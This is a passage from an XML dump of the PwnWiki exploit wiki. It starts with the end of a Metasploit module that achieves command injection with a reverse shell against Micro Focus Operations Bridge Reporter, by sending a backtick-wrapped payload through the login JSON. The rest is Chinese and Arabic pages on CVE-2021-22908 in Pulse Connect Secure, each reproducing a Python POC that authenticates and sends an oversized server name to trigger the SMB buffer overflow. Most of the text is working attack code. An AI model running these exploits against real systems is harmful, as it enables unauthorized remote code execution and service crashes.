            ['URL', 'https://softwaresupport.softwaregrp.com/doc/KM03775947']
          ],
        'Platform' =&gt; 'unix',
        'Arch' =&gt; ARCH_CMD,
        'Privileged' =&gt; true,
        'Payload' =&gt;
          {
            'Space' =&gt; 1024, # This should be a safe value, it might take much more
            'DisableNops' =&gt; true,
            # avoid null char and the injection char (`)
            'BadChars' =&gt; "\x00\x60",
            'Compat' =&gt;
              {
                'PayloadType' =&gt; 'cmd',
                # all of these (and more) should exist in a standard RHEL / SuSE
                # ... which are the only two distros supported by Micro Focus OBR
                # (telnet doesn't seem to work though)
                #
                # all reverse shells were tested and work flawlessly
                'RequiredCmd' =&gt; 'netcat openssl generic python'
              }
          },
        'Targets' =&gt;
          [
            [ 'Micro Focus Operations Bridge Reporter (Linux) versions &lt;= 10.40', {} ],
          ],
        'DefaultTarget' =&gt; 0,
        'DisclosureDate' =&gt; '2021-02-09'
      )
    )

    register_options(
      [
        # normal (no SSL) port is 21411
        Opt::RPORT(21412),
        OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),
        OptString.new('TARGETURI', [true, 'Application path', '/'])
      ]
    )
  end

  def check
    res = send_request_raw({
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(datastore['TARGETURI'], '/AdminService/urest/v1/LogonResource'),
      'headers' =&gt; { 'Content-Type' =&gt; 'application/json' },
      'data' =&gt; rand_text_alpha(10..64)
    }, 10)

    if res &amp;&amp; res.code == 400 &amp;&amp; res.body.include?('Unrecognized token')
      # should return a stack trace like
      # Unrecognized token '#{data}': was expecting ('true', 'false' or 'null')
      #  at [Source: org.glassfish.jersey.message.internal.ReaderInterceptorExecutor$UnC (...)
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    # if there are any 0x22 (") chars in the encoded payload, escape them with a backslash
    # we have to do this manually, the encoder is not smart enough to do it, and it will
    # fail if we put 0x22 as a bad char above
    payload_enc = payload.encoded.gsub('"', '\\"')

    # we use 0x60 (`) for injection, but there are lots of other possibilities
    data = "{\"userName\":\"#{rand_text_alpha(1..16)}`#{payload_enc}`\",\"credential\":\"#{rand_text_alpha(8..20)}\"}"

    send_request_raw({
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(datastore['TARGETURI'], '/AdminService/urest/v1/LogonResource'),
      'headers' =&gt; { 'Content-Type' =&gt; 'application/json' },
      'data' =&gt; data
    }, 0)

    # it's tricky to check the return value of the request here
    # - it might hang (no return) and give us a shell
    # - it might return 400 or 500 and give us a shell
    # - it might return 400 or 500 and give us nothing
    # so ignore it altogether and hope for the best
    print_status("#{peer} - Payload sent, now wait for Shelly, if she doesn't arrive try again!")
  end
end
&lt;/pre&gt;</text>
      <sha1>5le0wwx29wj0ykzgz2alzu7z30va7uz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>3367</id>
    <revision>
      <id>3931</id>
      <timestamp>2021-06-04T01:50:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞描述==  由於PCS支持連接到Windows文件共享（SMB）的功能由基於Samba 4.5.10的庫和輔助應用程序的CGI腳本提供。..."</comment>
      <origin>3931</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11799" sha1="6uwuyu7w777rxrjpn4nikpn0n1kxbnv" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞描述==

由於PCS支持連接到Windows文件共享（SMB）的功能由基於Samba 4.5.10的庫和輔助應用程序的CGI腳本提供。當為某些SMB操作指定一個長的服務器名稱時，smbclt應用程序可能會由於緩衝區溢出而崩潰，具體取決於指定的服務器名稱長度。

已經確認PCS 9.1R11.4系統存在此漏洞，目標CGI端點為&lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;，其它CGI端點也可能會觸發此漏洞。

如果攻擊者在成功利用此漏洞後沒有進行清理，則指定一個長的服務器名稱可能會導致如下PCS事件日誌條目：
&lt;/translate&gt;
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

&lt;translate&gt;
但要利用此漏洞，PCS服務器必須有一個允許\\*的Windows文件訪問策略或允許攻擊者連接到任意服務器的其他策略。可以在PCS的管理頁面中，查看用戶-&gt;資源策略-&gt;Windows 文件訪問策略，來查看當前的SMB策略。9.1R2及之前的PCS設備使用允許連接到任意SMB主機的默認策略，從9.1R3開始，這個策略從默認允許更改為默認拒絕。
&lt;/translate&gt;

&lt;translate&gt;
==影響範圍==
&lt;/translate&gt;
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>6uwuyu7w777rxrjpn4nikpn0n1kxbnv</sha1>
    </revision>
    <revision>
      <id>3932</id>
      <parentid>3931</parentid>
      <timestamp>2021-06-04T01:51:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>3932</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11876" sha1="ackp9a9rd1ym9xl8k6m5uldhaog0vwl" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞描述== &lt;!--T:1--&gt;

&lt;!--T:2--&gt;
由於PCS支持連接到Windows文件共享（SMB）的功能由基於Samba 4.5.10的庫和輔助應用程序的CGI腳本提供。當為某些SMB操作指定一個長的服務器名稱時，smbclt應用程序可能會由於緩衝區溢出而崩潰，具體取決於指定的服務器名稱長度。

&lt;!--T:3--&gt;
已經確認PCS 9.1R11.4系統存在此漏洞，目標CGI端點為&lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;，其它CGI端點也可能會觸發此漏洞。

&lt;!--T:4--&gt;
如果攻擊者在成功利用此漏洞後沒有進行清理，則指定一個長的服務器名稱可能會導致如下PCS事件日誌條目：
&lt;/translate&gt;
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:5--&gt;
但要利用此漏洞，PCS服務器必須有一個允許\\*的Windows文件訪問策略或允許攻擊者連接到任意服務器的其他策略。可以在PCS的管理頁面中，查看用戶-&gt;資源策略-&gt;Windows 文件訪問策略，來查看當前的SMB策略。9.1R2及之前的PCS設備使用允許連接到任意SMB主機的默認策略，從9.1R3開始，這個策略從默認允許更改為默認拒絕。
&lt;/translate&gt;

&lt;translate&gt;
==影響範圍== &lt;!--T:6--&gt;
&lt;/translate&gt;
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:7--&gt;
&lt;/translate&gt;
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>ackp9a9rd1ym9xl8k6m5uldhaog0vwl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/ar</title>
    <ns>0</ns>
    <id>3454</id>
    <revision>
      <id>4020</id>
      <timestamp>2021-06-04T02:17:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== وصف الثغرة =="</comment>
      <origin>4020</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12471" sha1="krldbsvaiyjjy2l5ltf2kq08d65t9rs" xml:space="preserve">&lt;languages  /&gt;
== وصف الثغرة ==

نظرًا لأن PCS يدعم الاتصال بمشاركة ملفات Windows (SMB) ، يتم توفير الوظيفة بواسطة البرامج النصية CGI المستندة إلى مكتبات Samba 4.5.10 والتطبيقات المساعدة. عند تحديد اسم خادم طويل لعمليات SMB معينة ، قد يتعطل تطبيق smbclt بسبب تجاوز سعة المخزن المؤقت ، اعتمادًا على طول اسم الخادم المحدد.

تم التأكد من أن نظام PCS 9.1R11.4 به هذه الثغرة الأمنية ، ونقطة نهاية CGI المستهدفة هي &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;. قد تؤدي نقاط نهاية CGI الأخرى أيضًا إلى تشغيل هذه الثغرة الأمنية.

إذا فشل المهاجم في التنظيف بعد نجاح استغلال هذه الثغرة الأمنية ، فقد يؤدي تحديد اسم خادم طويل إلى إدخالات سجل أحداث PCS التالية:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

ولكن لاستغلال هذه الثغرة الأمنية ، يجب أن يكون لدى خادم PCS سياسة وصول إلى ملفات Windows تسمح بـ \\ * أو سياسة أخرى تسمح للمهاجمين بالاتصال بأي خادم. يمكنك عرض سياسة SMB الحالية من خلال عرض المستخدم-&gt; سياسة الموارد-&gt; سياسة الوصول إلى ملفات Windows في صفحة إدارة PCS. تستخدم أجهزة 9.1R2 وأجهزة PCS الأقدم السياسة الافتراضية للسماح بالاتصالات بأي مضيف SMB. بدءًا من 9.1R3 ، تم تغيير هذه السياسة من الإذن الافتراضي إلى الرفض الافتراضي.

== نطاق التأثير ==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
